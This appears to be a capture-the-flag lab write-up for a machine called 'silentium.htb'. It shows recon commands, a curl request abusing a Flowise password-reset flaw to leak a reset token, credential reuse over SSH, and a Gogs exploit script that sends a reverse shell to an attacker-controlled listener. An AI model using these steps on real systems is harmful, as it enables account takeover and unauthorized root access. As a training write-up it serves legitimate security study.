Enumeration

Started with a full port scan:


sudo nmap 10.129.x.x -p- -sV -sC -O -T4


### Results:

- 22/tcp → SSH (OpenSSH 9.6p1)  
- 80/tcp → HTTP (nginx 1.24.0)  

The web server was identified as the primary attack surface.

---

## Web Enumeration

whatweb http://10.129.x.x

### Observation:

- Redirect → `http://silentium.htb`

Added to `/etc/hosts`:


10.129.x.x silentium.htb

## Directory Fuzzing


gobuster dir -u http://silentium.htb
 -w common.txt --exclude-length 8753


No significant directories were discovered.

---

## Subdomain Enumeration

ffuf -u http://silentium.htb

-H "Host: FUZZ.silentium.htb"
-w subdomains-top1million-20000.txt
-fr "silentium.htb"

### Found:

- `staging.silentium.htb`

Added to `/etc/hosts`.

---

## Staging Environment

The `staging.silentium.htb` subdomain revealed:

- A Flowise (v3.0.5) application

---

## Exploitation

### CVE-2025-58434 – Password Reset Abuse

#### Endpoint:


POST /api/v1/account/forgot-password


### Exploit:

curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password

-H "Content-Type: application/json"
-d '{"user":{"email":"ben@silentium.htb
"}}'

### Response:

The response leaked sensitive information:

- bcrypt password hash  
- tempToken  
- full user details  

---

## Password Reset

#### Endpoint:

POST /api/v1/account/reset-password


Using the `tempToken`, the password was reset:


NewPass123!


---

## Login

#### Endpoint:


POST /api/v1/auth/login


Successful authentication as:

- ben (admin)

---

## Remote Code Execution (RCE)

After gaining access to the application, internal functionality of Flowise was abused to execute system commands.

A shell was obtained inside the container environment.

---

## Credential Discovery

Performed environment enumeration: env


### Discovered credentials:

- FLOWISE_PASSWORD=F1l3_d0ck3r  
- SMTP_PASSWORD=r04D!!_R4ge  

The SMTP_PASSWORD was reused as a system credential.

---

## SSH Access

ssh ben@silentium.htb

Successful access to the host as:

- ben

---

## Internal Service Discovery


netstat -tulpn | grep 3001


### Observation:

- Service running on 127.0.0.1:3001

Not externally accessible (localhost only).

---

## Port Forwarding

ssh -L 3001:127.0.0.1:3001 ben@silentium.htb

Accessed locally via: http://localhost:3001

---

## Privilege Escalation – Gogs Exploitation

The service on port 3001 was identified as:

- Gogs (v0.13.0)

After port forwarding, access to the internal Gogs instance was achieved via:


http://localhost:3001

A new user account was created and an API token was generated from:

Settings → Applications

---

### Exploitation

A public exploit script was used to abuse a vulnerability in Gogs that allows command execution via git hooks and symlink manipulation.

Command used:

python3 exploit.py
-u http://localhost:3001

-un test
-pw test
-t <API_TOKEN>
-lh <YOUR_IP>
-lp 5555


---

### Reverse Shell Listener

Before running the exploit, a listener was started:


nc -lvnp 5555


---

### Result

After running the exploit, a reverse shell was received:

- Initial access inside Gogs environment
- Escalation to root via malicious git hook execution

---

## Explanation of Parameters

### `-t` (API Token)

The `-t` parameter represents the **Gogs API token**, which is required to authenticate API requests during exploitation.

---

### How the token was obtained

1. Logged into Gogs web interface  
2. Navigated to: Settings → Applications
3. Generated a new API token  
4. Used this token in the exploit script  

---




